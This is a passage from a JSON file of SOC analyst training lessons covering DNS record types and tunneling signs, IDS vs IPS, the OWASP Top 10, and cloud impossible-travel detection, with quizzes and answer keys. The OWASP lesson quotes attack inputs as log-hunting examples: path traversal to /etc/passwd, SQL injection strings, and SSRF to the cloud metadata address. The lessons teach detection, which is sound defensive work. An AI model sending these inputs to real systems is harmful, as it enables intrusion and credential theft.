      "content": "DNS holds many **record types**, each answering a different question about a name. Recognizing them in query logs tells you what a host was trying to do.\n\n| Record | Purpose | Analyst relevance |\n|---|---|---|\n| **A** | Maps a name to an IPv4 address | The most common lookup; what host is being reached |\n| **AAAA** | Maps a name to an IPv6 address | Same as A but for IPv6; easy to overlook |\n| **CNAME** | Alias pointing one name to another name | Redirection chains; used by CDNs and some abuse |\n| **MX** | Mail exchanger for a domain | Where email for a domain is delivered |\n| **TXT** | Arbitrary text (SPF, DKIM, verification) | Also abused to smuggle data or C2 payloads |\n| **NS** | Delegates a zone to authoritative name servers | Who controls a domain's records |\n| **PTR** | Reverse lookup: IP back to a name | Used to name an address; part of enrichment |\n\nA few deserve extra attention. **CNAME** records create alias chains — `www.example.com` might be a CNAME to a CDN hostname that is itself a CNAME to another — and following those chains is routine in investigations. **TXT** records are a favorite of attackers because they can hold arbitrary strings; **DNS tunneling** and some C2 frameworks stash encoded data in TXT queries and responses. **MX** lookups tell you a host is preparing to send mail, useful when a workstation that should never send email suddenly does MX lookups for many external domains — a possible spam-bot or compromise signal. **PTR** (reverse DNS) is the inverse mapping and shows up when tools or logs enrich an IP into a hostname.\n\nAs an analyst, the record type is a clue to intent: a burst of **A/AAAA** lookups for many random-looking hostnames hints at malware resolving a **DGA (domain generation algorithm)** list; unusual **TXT** query volume hints at tunneling; **MX** lookups from a non-mail host hint at abuse. You are reading the *questions* a host asks, and the questions often reveal purpose before a single byte of payload moves."
    },
    {
      "heading": "DNS Security: DNSSEC, DoH, and DoT",
      "content": "Classic DNS was designed in a trusting era: queries and answers travel in **plaintext UDP** with no authentication, which invites two problems — **tampering** (forging answers to redirect victims, i.e., cache poisoning/spoofing) and **eavesdropping** (anyone on the path can read what names you look up). Three technologies address these, and each has a different effect on *your* visibility.\n\n**DNSSEC (DNS Security Extensions)** tackles **authenticity/integrity**, not privacy. It adds cryptographic signatures to DNS records so a resolver can verify that an answer genuinely came from the authoritative source and was not altered in transit. DNSSEC does **not** encrypt anything — queries are still visible — it just makes forged answers detectable. For an analyst, DNSSEC reduces the risk of poisoning-based redirection but does not change what you can log.\n\n**DoT (DNS over TLS)** and **DoH (DNS over HTTPS)** tackle **privacy/confidentiality** by encrypting the query between the client and the resolver. DoT runs on its own dedicated port (**853**), which at least makes it identifiable on the network. **DoH** is the visibility-killer: it wraps DNS inside ordinary **HTTPS on port 443**, so DNS lookups become indistinguishable from normal web traffic to a network sensor.\n\nThis is a genuine double-edged sword for the SOC. Encryption protects users from eavesdropping and is good for privacy, but it can **blind the network-level DNS monitoring** that analysts depend on. If endpoints or browsers use an external DoH resolver, your corporate DNS server never sees those lookups, and one of your best log sources goes dark. The common defensive responses: **force all clients to use the internal, logged resolver**, **block or detect external DoH/DoT endpoints**, and lean more on **endpoint (EDR) DNS telemetry** where the lookup is visible on the host before encryption. Recognizing whether your environment allows external DoH is essential context — it determines whether the absence of a lookup in your DNS logs means the host stayed quiet or simply resolved names through a channel you cannot see."
    },
    {
      "heading": "Why DNS Is the First Place Investigations Look",
      "content": "Ask experienced analysts where they start an investigation and DNS logs come up again and again. The reasons are structural, not habit.\n\n**DNS records intent early.** Because a name lookup precedes the actual connection, DNS logs capture what a host *intended* to reach even if the connection later fails or is encrypted. A workstation that resolves a known-malicious domain has already told you something, regardless of what happened next.\n\n**It is a compact, central, high-signal source.** One recursive resolver logs every internal host's lookups in a small, uniform format — far lighter than full packet capture and available for nearly every host. That makes DNS ideal for both alerting and retrospective hunting across the whole estate.\n\nThree hunting patterns you should know by name:\n\n- **Newly registered domains (NRDs).** Malware and phishing frequently use domains registered days or hours before use. Enriching lookups with **domain age** and flagging very young domains catches a large slice of malicious activity cheaply.\n- **DGA domains.** Some malware generates hundreds of algorithmic, random-looking domains (`kq3v9z7x.info`) and tries them until one resolves to the current C2. In DNS logs this appears as a **flood of A/AAAA lookups for high-entropy names, most returning NXDOMAIN (nonexistent)** — a very recognizable pattern.\n- **DNS tunneling (teaser).** Data can be smuggled inside DNS itself — encoded in the subdomains of queries or in TXT responses — to exfiltrate data or carry C2 past firewalls that trustingly allow DNS. Tells include abnormally long or high-entropy subdomains, unusual query volume to one domain, and heavy TXT/NULL record use. We will go deep on tunneling in a later lesson, but even now you should treat a single internal host generating thousands of unique subdomain queries to one parent domain as suspicious.\n\nThe throughline: DNS turns a host's *intentions* into log lines you can search. Master reading those lines — the record types, the domain ages, the entropy, the query volumes — and you gain an early-warning system that fires before the payload ever moves. That is why DNS is so often the first pivot and the last word in a SOC investigation."
    }
  ],
  "keyTakeaways": [
    "Because a name lookup precedes almost every connection, DNS logs at the recursive resolver capture each host's intent early and centrally — making them the first pivot for spotting malicious destinations, newly registered domains, and DGA activity.",
    "DNSSEC protects answer integrity but not privacy, while DoH/DoT encrypt lookups and can blind network DNS monitoring — so force clients to the internal logged resolver, detect external DoH, and rely on endpoint DNS telemetry where needed."
  ],
  "quiz": [
    {
      "question": "In your DNS logs a single internal workstation generates hundreds of lookups for random-looking, high-entropy hostnames within a few minutes, and most responses are NXDOMAIN. What does this pattern most likely indicate?",
      "options": [
        {
          "label": "A misconfigured DNS server that is failing to cache answers and therefore repeatedly forwarding the same query upstream.",
          "value": "a"
        },
        {
          "label": "Malware using a domain generation algorithm, cycling through many algorithmic domains until one resolves to its current C2 server.",
          "value": "b"
        },
        {
          "label": "Normal web browsing, since modern websites legitimately trigger hundreds of unrelated random hostname lookups per page.",
          "value": "c"
        },
        {
          "label": "A DNSSEC validation failure that forces the resolver to retry each signed record under many different names.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): a flood of high-entropy hostname lookups mostly returning NXDOMAIN is the classic DGA signature — malware tries many algorithmic domains until it finds the one currently registered for C2. (a) is wrong: caching failures repeat the *same* name, not many unique high-entropy names. (c) is wrong: legitimate browsing resolves recognizable domains and does not produce mass NXDOMAIN responses. (d) is wrong: DNSSEC validation concerns signature checks on real records, not the generation of hundreds of random nonexistent names."
    },
    {
      "question": "Your organization logs DNS at the internal recursive resolver. Some endpoints begin using an external DNS-over-HTTPS (DoH) resolver. What is the security impact and best response?",
      "options": [
        {
          "label": "DoH encrypts DNS inside port 443 HTTPS, so those lookups bypass your logging; force clients to the internal resolver and detect external DoH.",
          "value": "a"
        },
        {
          "label": "DoH improves your visibility because encrypted lookups are automatically decrypted and stored in full by the internal recursive resolver.",
          "value": "b"
        },
        {
          "label": "DoH has no monitoring impact since all DNS queries, encrypted or not, are still recorded centrally by the root name servers.",
          "value": "c"
        },
        {
          "label": "DoH only affects DNSSEC signature validation, so the correct fix is to disable DNSSEC on the internal resolver entirely.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct (a): DoH wraps DNS in ordinary HTTPS on port 443, so those lookups no longer reach your internal resolver's logs; the standard response is to force clients onto the internal logged resolver and detect or block external DoH. (b) is wrong: the internal resolver never sees externally-resolved DoH queries, so it cannot decrypt or store them. (c) is wrong: root servers do not log every organization's client queries. (d) is wrong: DoH is about privacy/encryption, not DNSSEC validation, and disabling DNSSEC would only remove integrity protection."
    }
  ],
  "references": [
    "https://www.cloudflare.com/learning/dns/what-is-dns/",
    "https://datatracker.ietf.org/doc/html/rfc8484",
    "https://www.sans.org/blog/detecting-dns-tunneling/"
  ],
  "xp": 180,
  "estimatedMinutes": 35,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "networking-lesson-ids-vs-ips",
  "slug": "ids-vs-ips",
  "title": "IDS vs IPS",
  "topic": "Network Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "IDS and IPS are two of the most misunderstood boxes on a network diagram, yet the alerts they produce land on a SOC analyst's queue every day. The difference between them is really a difference in *where they sit* and *what they are allowed to do* — one watches and warns, the other stands in the path and blocks. This lesson pins down that distinction, explains signature versus anomaly detection, and shows what you actually do with the alerts they generate.",
  "sections": [
    {
      "heading": "Detection vs Prevention: Out-of-Band vs Inline",
      "content": "An **IDS (Intrusion Detection System)** monitors network traffic for malicious or policy-violating activity and **raises an alert** when it sees something suspicious. Crucially, an IDS is typically deployed **out-of-band** — it receives a *copy* of the traffic and sits outside the actual forwarding path. Because it is not in the path, it can watch everything without risking network availability, but it also **cannot stop** what it sees; by the time it alerts, the packet has already passed.\n\nAn **IPS (Intrusion Prevention System)** does everything an IDS does *and* can **actively block** malicious traffic. To do that it must sit **inline** — directly in the forwarding path, so every packet flows *through* it. Being inline is what gives the IPS the power to drop, reset, or reject a connection in real time, but it also means the IPS is a potential point of failure and latency: if it goes down or slows, it can disrupt legitimate traffic.\n\nThe cleanest way to remember the distinction:\n\n| | IDS | IPS |\n|---|---|---|\n| Placement | Out-of-band (copy of traffic) | Inline (in the traffic path) |\n| Primary action | Alert / log | Alert **and** block/drop/reset |\n| Effect on traffic | None (passive) | Can stop packets in real time |\n| Risk if it fails | Loses visibility only | Can disrupt or drop legitimate traffic |\n| Analyst posture | Investigate after the fact | Investigate + verify what was blocked |\n\nThink of an IDS as a **security camera** — it records and alarms but cannot lock the door — and an IPS as a **security guard at the door** who can actually stop someone from entering. Many modern products are technically the same engine that can run in either mode; whether it *detects* or *prevents* comes down to deployment and configuration. That single choice — inline or out-of-band — drives everything else, including how much you trust the box to act automatically and how carefully it must be tuned before you let it block."
    },
    {
      "heading": "Signature-Based vs Anomaly-Based Detection",
      "content": "Independent of placement, an IDS/IPS decides *what* is malicious using one (usually both) of two detection philosophies.\n\n**Signature-based detection** matches traffic against a database of known **signatures** — specific patterns tied to known attacks, malware, or exploits (a byte sequence, a suspicious URI, a known-bad payload). It is precise and produces **explainable, low-false-positive alerts for known threats**: when a signature fires, you can read exactly which rule matched and why. Its weakness is symmetrical — it can only catch what someone has already written a signature for, so **novel or zero-day attacks and simple obfuscation can slip past**. Signature sets must be updated constantly, much like antivirus definitions.\n\n**Anomaly-based detection** builds a **baseline of normal behavior** and flags deviations from it. Instead of asking 'does this match a known attack?', it asks 'is this unusual for this network?' — an unexpected protocol on a port, a host suddenly transferring far more data than usual, a spike in connections. Its strength is the mirror image of signatures: it can catch **previously unseen attacks** that no signature covers. Its weakness is a **higher false-positive rate**, because 'unusual' is not the same as 'malicious' — a legitimate but rare event (a backup job, a new application rollout) can trip it.\n\n| | Signature-based | Anomaly-based |\n|---|---|---|\n| Detects by | Matching known patterns | Deviation from a learned baseline |\n| Catches novel attacks? | No | Yes |\n| False positives | Lower | Higher |\n| Alert explainability | High (named rule) | Lower (statistical) |\n\nFor an analyst, the *type* of detection shapes how you triage. A **signature alert** hands you a named rule and a reference — start by confirming the match was real and not a benign string that happened to fit the pattern. An **anomaly alert** hands you a statistical outlier with less context — start by establishing what 'normal' looks like for that host and whether there is a benign explanation. Good programs run both: signatures for cheap, high-confidence detection of known bad, and anomaly detection to surface the unknown that signatures structurally cannot see."
    },
    {
      "heading": "Placement, Taps, and SPAN",
      "content": "Where you put the sensor determines what it can see, and how you feed it traffic differs sharply between IDS and IPS.\n\nBecause an **IDS is out-of-band**, it needs a *copy* of the traffic. Two mechanisms provide that copy:\n\n- A **network tap** is a hardware device inserted into a physical link that passively duplicates every passing packet to a monitoring port. Taps are reliable, do not drop frames under load, and are the preferred feed for serious monitoring.\n- A **SPAN port** (Switched Port Analyzer), also called port mirroring, is a switch feature that copies traffic from selected ports or VLANs to a designated mirror port. SPAN is cheap and flexible but can **drop mirrored packets under heavy load** and may not capture certain error frames, so it is a lighter-weight option than a tap.\n\nEither way, the IDS analyzes a duplicate stream and never touches the originals — which is exactly why it cannot block.\n\nAn **IPS**, by contrast, is spliced **directly into the link** so the real traffic passes through it; there is no copy, because the IPS *is* on the path and can therefore drop packets. This inline position is usually chosen at a **network chokepoint** — commonly at the **perimeter**, just inside or integrated with the edge firewall, where all ingress/egress traffic converges. Sensors are also placed at **internal segment boundaries** (for example between the user VLAN and the server/DMZ) to watch **east-west lateral movement**, and in front of especially sensitive assets.\n\nThis placement reasoning connects directly to the subnet and segmentation ideas from earlier lessons. The most valuable sensor locations are the **boundaries you already care about** — the perimeter and the crossings between trust zones — because that is where an attacker's traffic must pass and where a single sensor sees the most meaningful flows. When you receive an alert, knowing *which sensor and which chokepoint* it came from is itself intelligence: a perimeter sensor firing on inbound traffic tells a different story than an internal sensor firing on a workstation reaching a server subnet. Always read the sensor's vantage point as part of the alert."
    },
    {
      "heading": "False Positives, Tuning, and Working the Alerts",
      "content": "IDS/IPS sensors are only as useful as their tuning, and tuning is where the analyst's judgment meets the engineering. A freshly deployed sensor with default rules is typically **noisy** — it fires on benign traffic that superficially resembles attacks. That noise is dangerous in two ways: it buries real detections (alert fatigue), and on an *IPS* a false positive does not merely annoy, it can **block legitimate business traffic**, which is why IPS blocking rules are introduced cautiously and often run in 'alert-only' mode first.\n\n**Tuning** is the ongoing process of reducing false positives while preserving true detections: disabling or refining rules that do not apply to your environment, adding exceptions for known-good sources, and adjusting anomaly baselines as the network changes. It is never 'set and forget' — new applications and traffic patterns require continual adjustment.\n\nWhen an IDS/IPS alert lands in your queue, a disciplined workflow serves you well:\n\n- **Read the rule.** What signature or anomaly fired, and what is it *supposed* to detect? The rule name, ID, and reference are your starting context.\n- **Confirm it is a true positive.** Examine the actual traffic or payload that triggered it. Did the pattern really indicate an attack, or did benign data coincidentally match? This is the core of triage.\n- **Establish context.** Which host, which sensor/chokepoint, inbound or outbound, and does the source or destination have a bad reputation? Pivot to firewall, DNS, and endpoint logs to corroborate.\n- **For IPS alerts, verify what was blocked.** If the IPS already dropped the traffic, confirm the block succeeded and decide whether any follow-up (endpoint isolation, hunting for earlier stages) is needed. A block is containment of *one* connection, not proof the threat is fully handled.\n- **Feed tuning back.** Recurring false positives should be reported so the rule is refined; a confirmed true positive may justify a *new* or tightened rule.\n\n**Snort** and **Suricata** are the two best-known open-source engines and are worth naming: both are rule-based systems (Suricata is multi-threaded and adds richer protocol and file analysis) that can run as either IDS or IPS depending on deployment. Recognizing their rule format — the named, referenced signatures you'll see in alerts — makes real-world IDS/IPS output far less intimidating and turns each alert into a lead you can actually work."
    }
  ],
  "keyTakeaways": [
    "The defining difference is placement and authority: an IDS is out-of-band (fed by a tap or SPAN), only alerts, and never touches traffic; an IPS is inline at a chokepoint and can block in real time — which is also why IPS rules must be tuned carefully before they drop anything.",
    "Signature detection catches known threats with explainable, low-false-positive alerts but misses novel attacks, while anomaly detection catches the unknown at the cost of more false positives — so triage a signature alert by confirming the match and an anomaly alert by establishing the host's normal baseline."
  ],
  "quiz": [
    {
      "question": "Your team wants a sensor that can actively drop a known exploit attempt before it reaches an internal server, not merely alert on it after the fact. Which deployment meets that requirement, and what trade-off comes with it?",
      "options": [
        {
          "label": "An IDS fed by a SPAN port, since mirrored traffic lets it reset malicious connections while staying safely off the forwarding path.",
          "value": "a"
        },
        {
          "label": "An inline IPS, which sits in the traffic path and can drop packets in real time but becomes a point of latency or failure.",
          "value": "b"
        },
        {
          "label": "An out-of-band IDS connected via a hardware tap, because taps duplicate traffic fast enough to block the original packets.",
          "value": "c"
        },
        {
          "label": "A perimeter firewall alone, since stateful firewalls inspect application payloads and block exploits without any dedicated sensor.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): only an inline IPS sits in the forwarding path and can drop malicious packets in real time, with the trade-off that being inline adds latency and a potential failure/availability risk. (a) is wrong: an IDS on a SPAN port only sees copies and cannot stop the originals. (c) is wrong: a tap also delivers only a copy to an out-of-band IDS, which cannot block. (d) is wrong: a traditional firewall filters by rules and state but is not designed to detect and drop specific exploit signatures the way an IPS does."
    },
    {
      "question": "A newly deployed IPS with default rules is generating many alerts, and some are blocking legitimate business traffic. What is the appropriate way to handle this situation?",
      "options": [
        {
          "label": "Disable the IPS entirely and replace it with an out-of-band IDS, because inline devices are inherently unsuitable for production.",
          "value": "a"
        },
        {
          "label": "Ignore the blocked-traffic reports, since any traffic an IPS drops is by definition malicious and safe to discard.",
          "value": "b"
        },
        {
          "label": "Tune the sensor by refining or disabling misfiring rules and adding known-good exceptions, ideally running new blocks in alert-only mode first.",
          "value": "c"
        },
        {
          "label": "Switch every rule to anomaly-based detection, which eliminates false positives because baselines never flag legitimate activity.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Correct (c): tuning — refining or disabling rules that misfire, adding exceptions for known-good sources, and validating new blocking rules in alert-only mode before enforcing — reduces false positives while preserving real detections. (a) is wrong: inline IPS is standard in production; the fix is tuning, not abandonment. (b) is wrong: an IPS can absolutely block legitimate traffic on a false positive, so those reports must be investigated. (d) is wrong: anomaly detection actually tends to produce *more* false positives, not fewer, since unusual is not the same as malicious."
    }
  ],
  "references": [
    "https://www.paloaltonetworks.com/cyberpedia/what-is-an-intrusion-prevention-system-ips",
    "https://docs.suricata.io/en/latest/what-is-suricata.html",
    "https://www.snort.org/faq/what-is-snort"
  ],
  "xp": 180,
  "estimatedMinutes": 35,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-owasp-top-10-tour",
  "slug": "owasp-top-10-tour",
  "title": "The OWASP Top 10: A SOC Analyst's Field Guide",
  "topic": "Web Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "The OWASP Top 10 is the industry's most-cited list of the most critical web application security risks, refreshed roughly every four years by the Open Worldwide Application Security Project. The 2021 edition ranks ten categories by real-world prevalence and impact. For a SOC analyst, the list is not just a developer checklist: it is a map of what attackers try against your web tier, and it tells you which log signatures to hunt for.",
  "sections": [
    {
      "heading": "What the OWASP Top 10 Is and Why It Exists",
      "content": "The **OWASP Top 10** is a consensus document that names the ten broad categories of web application risk that matter most. **OWASP** stands for the **Open Worldwide Application Security Project**, a non-profit foundation that publishes free security guidance. The list is rebuilt from data contributed by dozens of firms plus a community survey, so its rankings reflect how often each weakness actually appears in tested applications, not just how scary it sounds.\n\nThe 2021 revision changed shape from earlier editions. Categories were merged and renamed to describe **root causes** rather than single symptoms. For example, the old \"Sensitive Data Exposure\" became **A02 Cryptographic Failures**, pointing at the underlying cause instead of the visible result. Three categories were entirely new, added partly from the community survey because tooling struggles to detect them automatically.\n\nWhy should a SOC analyst care about a list aimed at developers? Because every category maps to attacker behaviour you can see in logs. When you read web server access logs, WAF alerts, or application logs, you are watching people probe for exactly these ten weaknesses. Knowing the categories lets you turn a raw HTTP request into a hypothesis: a burst of `../../etc/passwd` strings is a path-traversal attempt tied to **A01 Broken Access Control**; a `' OR 1=1--` payload is **A03 Injection**.\n\nThe list is deliberately broad. Each entry is a **category** containing many specific **CWE** (Common Weakness Enumeration) identifiers, not a single bug. This breadth is a strength for detection engineering: you can build alert logic per category and cover a whole family of attacks at once. Treat the Top 10 as your shared vocabulary with developers, penetration testers, and incident responders so that when an alert fires, everyone understands both the technique and the fix being discussed."
    },
    {
      "heading": "A01 to A05: Access, Crypto, Injection, Design, Misconfig",
      "content": "**A01 Broken Access Control** rose to number one in 2021. It means users can act outside their intended permissions, for example changing a URL from `/account?id=123` to `/account?id=124` and seeing someone else's data. This is called an **IDOR** (Insecure Direct Object Reference). In logs you see authenticated users touching resources they should never reach, or many `403 Forbidden` responses as an attacker probes.\n\n**A02 Cryptographic Failures** covers weak, missing, or misused encryption: passwords stored unhashed, TLS not enforced, or old ciphers accepted. The concrete example is a login form served over plain `HTTP`, letting an attacker on the network read credentials in transit.\n\n**A03 Injection** groups **SQL injection**, command injection, and cross-site scripting (**XSS**). Untrusted input is interpreted as code. A classic example is a search box where `'; DROP TABLE users;--` reaches the database. Access logs and WAF alerts often show the payload directly in query strings.\n\n**A04 Insecure Design** is a new, higher-level category about flaws baked into the architecture rather than the code, such as a password-reset flow with no rate limiting or anti-automation. You cannot patch your way out of a bad design; it must be re-thought using threat modelling.\n\n**A05 Security Misconfiguration** covers default passwords, verbose error pages, unnecessary open features, and unpatched sample apps. A frequent example is a cloud storage bucket or admin console left publicly accessible. This category is broad and extremely common in real breaches.\n\n| Rank | Category | One quick signal |\n|------|----------|------------------|\n| A01 | Broken Access Control | spikes of 403s, IDOR patterns |\n| A02 | Cryptographic Failures | plain HTTP logins, weak TLS |\n| A03 | Injection | SQL/script payloads in requests |\n| A04 | Insecure Design | missing rate limits by design |\n| A05 | Security Misconfiguration | default creds, exposed panels |\n\nFor an analyst, these five drive the majority of noisy, high-volume web attack traffic you will triage day to day."
    },
    {
      "heading": "A06 to A10: Components, Auth, Integrity, Logging, SSRF",
      "content": "**A06 Vulnerable and Outdated Components** is about running libraries, frameworks, or servers with known flaws. The defining real-world example is **Log4Shell** (CVE-2021-44228) in the Log4j logging library, which let attackers run code by sending a crafted string. If you cannot inventory your dependencies, you cannot know your exposure. Threat intel feeds and vulnerability scanners feed this category.\n\n**A07 Identification and Authentication Failures** covers weak login controls: credential stuffing, brute force, session tokens that never expire, or missing multi-factor authentication (**MFA**). In sign-in logs you spot it as many failed logins across accounts, or one account failing from many countries. This is prime SOC hunting ground.\n\n**A08 Software and Data Integrity Failures** is another new 2021 entry. It covers code and data trusted without verifying integrity, such as auto-updates pulled from an unsigned source or a compromised CI/CD pipeline. The **SolarWinds** supply-chain attack is the headline example, where a trusted update shipped malware.\n\n**A09 Security Logging and Monitoring Failures** is the category SOC analysts feel most personally. If applications do not log authentication, access control, and server-side errors, or if those logs are never reviewed, breaches go undetected for months. OWASP notes that most breaches are found by external parties, not internal monitoring, because of this gap. Weak logging directly lengthens **dwell time**.\n\n**A10 Server-Side Request Forgery (SSRF)** was added by community vote. An attacker tricks the server into making requests to destinations the attacker chooses, for example forcing a cloud server to fetch `http://169.254.169.254/`, the **metadata service** address, to steal credentials. You see it as unexpected outbound connections from your web servers to internal IPs.\n\nTogether these five are lower-volume but often higher-impact. A single exploited outdated component or one SSRF into cloud metadata can hand an attacker a foothold or credentials that no amount of firewall tuning will catch. This is exactly why **A09** matters so much: without good logging and an analyst reading it, the quieter categories succeed silently."
    },
    {
      "heading": "Reading Web Logs Through the OWASP Lens",
      "content": "The value of the Top 10 to a SOC analyst is that it turns abstract requests into named threats you can triage and escalate. When you open web access logs, a WAF console, or application logs, mentally sort each anomaly into a category. That classification decides urgency, next steps, and who you loop in.\n\nStart with the request itself. The **HTTP method**, **URL path**, **query string**, **status code**, **User-Agent**, and source IP together form a story. A sequence of `404`s walking through admin paths suggests reconnaissance for **A05 Misconfiguration**. A single `500` after a strange quote character hints at **A03 Injection** that reached the backend. Repeated `401`/`403` from one IP across many usernames is **A07 authentication abuse**, likely credential stuffing.\n\nStatus codes are your fast filter:\n\n- **200** on a sensitive resource by the wrong user: possible **A01** access-control break that succeeded.\n- **403 Forbidden** in bursts: someone probing authorization boundaries.\n- **500 Internal Server Error** clustered around odd input: backend choking on an **injection** attempt.\n- Unexpected **outbound** requests from a server to internal or metadata IPs: **A10 SSRF**.\n\nCorrelation matters more than any single line. One SQL-looking string might be a false positive from a security scanner; a hundred variations followed by a large `200` response body suggests successful data extraction. Pivot from the web log to the database or identity logs to confirm impact.\n\nFinally, remember **A09**. Your ability to do all of the above depends on applications actually emitting useful logs and on those logs reaching your SIEM with accurate timestamps and source IPs. Part of a mature SOC's job is pushing developers to log authentication events, access-control denials, and server-side failures. When you request a new log source or a richer field, you are directly reducing the organisation's dwell time. The OWASP Top 10 gives you the language to justify exactly which events you need and why each one matters."
    }
  ],
  "keyTakeaways": [
    "The OWASP Top 10 (2021) ranks web risk categories by real-world prevalence; A01 Broken Access Control is number one, and each category maps to attacker behaviour visible in web and identity logs.",
    "SOC analysts use the list as a triage vocabulary: HTTP status codes and payload patterns classify traffic into categories, while A09 Logging Failures underlies whether any of the other nine can even be detected."
  ],
  "quiz": [
    {
      "question": "You are reviewing web server logs and notice one external IP sending dozens of requests where the query string contains strings like ' OR '1'='1 and UNION SELECT, several of which returned HTTP 500 errors. Which OWASP Top 10 2021 category best describes this activity?",
      "options": [
        {
          "label": "A02 Cryptographic Failures, because the attacker is trying to break the site's TLS encryption to read data.",
          "value": "a"
        },
        {
          "label": "A03 Injection, because untrusted input is being crafted so the database interprets it as SQL commands.",
          "value": "b"
        },
        {
          "label": "A07 Authentication Failures, because the attacker is guessing many different account passwords.",
          "value": "c"
        },
        {
          "label": "A10 Server-Side Request Forgery, because the server is being forced to reach an attacker-chosen URL.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The `' OR '1'='1` and `UNION SELECT` payloads are classic SQL injection, which falls under A03 Injection: untrusted input is interpreted as database code. The 500 errors suggest the backend is choking on malformed queries. A02 is wrong because nothing here targets TLS or encryption. A07 is wrong because these are injection payloads, not password guessing across accounts. A10 is wrong because SSRF involves forcing the server to make outbound requests, not sending SQL in query strings."
    },
    {
      "question": "Your incident review finds that a breach went undetected for four months because the application never logged failed authorization checks and no one monitored the logs it did produce. Which category most directly names this weakness, and why does it matter to a SOC?",
      "options": [
        {
          "label": "A05 Security Misconfiguration, since default settings were left unchanged on the web server.",
          "value": "a"
        },
        {
          "label": "A01 Broken Access Control, since users were able to reach resources beyond their permissions.",
          "value": "b"
        },
        {
          "label": "A09 Security Logging and Monitoring Failures, since missing logs and review let the breach stay hidden.",
          "value": "c"
        },
        {
          "label": "A06 Vulnerable and Outdated Components, since an unpatched library gave the attacker their foothold.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Missing authorization logging plus no monitoring is exactly A09 Security Logging and Monitoring Failures, which OWASP added because most breaches are found by outsiders due to this gap; it directly increases dwell time. A05 concerns insecure configuration, not absent logging. A01 describes the access break itself, but the question asks about why it stayed hidden. A06 concerns outdated components, which is not what the scenario describes."
    }
  ],
  "references": [
    "https://owasp.org/Top10/",
    "https://owasp.org/www-project-top-ten/",
    "https://cheatsheetseries.owasp.org/"
  ],
  "xp": 210,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-impossible-travel-signin-anomalies",
  "slug": "impossible-travel-signin-anomalies",
  "title": "Impossible Travel and Cloud Sign-in Anomalies",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When an account signs in from Tel Aviv and then from Brazil eleven minutes later, no human made that trip. Impossible travel is one of the most reliable behavioural signals that credentials have been stolen. This lesson covers impossible travel and the family of cloud sign-in anomalies around it, how identity providers like Microsoft Entra ID Protection score them, why benign activity triggers false positives, and how a SOC analyst investigates and responds.",
  "sections": [
    {
      "heading": "What Impossible Travel Means",
      "content": "**Impossible travel** is a detection that fires when a single account authenticates from two geographically distant locations within a time window too short to physically travel between them. If a sign-in from Israel is followed forty minutes later by a sign-in from the United States, the implied travel speed exceeds any aircraft, so at least one of those sessions is not the legitimate user.\n\nThe detection works by comparing the **source IP geolocation** and **timestamp** of consecutive sign-ins for the same identity. The provider estimates the distance between the two locations and divides by the elapsed time to get an implied speed. When that speed crosses a threshold, or when the two locations are simply implausible given the gap, the sign-in is flagged as anomalous. Microsoft classifies this under **Entra ID Protection** as an offline risk detection, meaning it can surface shortly after the events rather than instantly, because it needs to observe the pair.\n\nImpossible travel is powerful because it targets **behaviour, not credentials**. An attacker who has phished a valid password and even satisfied MFA still cannot be in two places at once. When their session originates from a different country than the real user's normal pattern, the geographic contradiction exposes the compromise even though every credential was technically correct.\n\nThe detection needs a **baseline**. Providers learn each user's familiar locations, devices, and typical travel over time. Early in a user's history, or right after onboarding, there is little baseline, so the system is more cautious. Once a pattern of, say, Tel Aviv weekdays and occasional Jerusalem is established, a sudden authenticated session from Nigeria stands out sharply.\n\nIn practice, impossible travel rarely fires alone in a real intrusion. It usually appears alongside other signals such as an unfamiliar sign-in, an anonymous IP, or a new device. Correlating it with those companions is what separates a genuine account takeover from a noisy one-off, which is exactly the analyst's job in the sections that follow."
    },
    {
      "heading": "The Wider Family of Sign-in Anomalies",
      "content": "Impossible travel is one member of a broader set of **sign-in risk detections**. A SOC analyst should recognise the whole family because attackers trip several of them at once.\n\n**Unfamiliar sign-in properties** fires when the combination of IP, device, browser, and location does not match the user's learned history. It is a machine-learning signal that weights many attributes, so a user logging in from a brand-new country on an unseen device scores high.\n\n**Anonymous IP address** flags sign-ins routed through anonymising infrastructure such as the **Tor** network or anonymising VPNs. Legitimate users occasionally use these, but attackers use them heavily to hide origin, so the signal is meaningful.\n\n**Malicious IP address** and **password spray** detections tie a sign-in to IPs known for attacks or to a pattern where one password is tried against many accounts. **Atypical token** or **token anomaly** detections notice sign-in tokens with unusual characteristics, which can indicate **token theft**, where an attacker replays a stolen session token rather than a password.\n\n**MFA fatigue**, also called **MFA bombing** or push-notification spamming, is not a single log line but a pattern: repeated MFA prompts to a user until they approve one out of annoyance. In logs you see many MFA challenges in quick succession, most denied, then one approval. This is mapped to attacker technique for prompt bombing and is a rising cause of takeovers.\n\n| Signal | What it indicates |\n|--------|-------------------|\n| Impossible travel | Two distant logins, too fast |\n| Unfamiliar properties | New IP/device/location combo |\n| Anonymous IP / Tor | Origin deliberately hidden |\n| Atypical token | Possible session token replay |\n| MFA fatigue | Repeated prompts until approval |\n\nEach of these can be low or high severity on its own. Their real diagnostic power comes from **stacking**: a single account that in one hour shows an anonymous IP, unfamiliar properties, impossible travel, and a burst of denied MFA prompts is almost certainly compromised. Learning to read the family together, rather than chasing each alert in isolation, is the core skill of cloud sign-in investigation."
    },
    {
      "heading": "How Identity Providers Score Risk",
